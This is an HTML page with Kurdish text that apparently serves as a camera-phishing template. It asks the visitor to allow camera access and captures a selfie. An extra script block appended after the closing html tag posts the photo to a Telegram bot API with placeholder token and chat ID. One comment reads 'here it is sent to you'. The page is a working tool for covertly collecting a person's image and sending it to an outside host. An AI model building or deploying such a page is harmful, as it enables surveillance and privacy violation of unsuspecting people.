<!DOCTYPE html>
<html lang="ku">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Camera</title>
</head>
<body style="text-align:center; font-family:sans-serif">

<h3>تکایە ڕێگە بدە کامێرا بکڕێتەوە</h3>

<video id="video" autoplay playsinline style="width:90%;"></video>
<br><br>
<button onclick="takePhoto()">📸 وێنە بگرە</button>
<br><br>
<canvas id="canvas" style="display:none;"></canvas>

<script>
navigator.mediaDevices.getUserMedia({
  video: { facingMode: "user" } // سێلفی
})
.then(stream => {
  document.getElementById("video").srcObject = stream;
})
.catch(() => {
  alert("ڕێگە بە کامێرا نەدرا");
});

function takePhoto() {
  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video, 0, 0);
  
  const imageData = canvas.toDataURL("image/jpeg");
  console.log(imageData); 
  alert("وێنە گیرا ✅");
  // لێرە دەنێردرێت بۆ تۆ
}
</script>

</body>
</html>
<script>
function takePhoto() {
  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video, 0, 0);

  canvas.toBlob(function(blob) {
    let formData = new FormData();
    formData.append("chat_id", "CHAT_ID");
    formData.append("photo", blob);

    fetch("https://api.telegram.org/botTOKEN/sendPhoto", {
      method: "POST",
      body: formData
    }).then(() => {
      alert("وێنە نێردرا بۆ تیلیگرام ✅");
    });
  }, "image/jpeg");
}
</script>
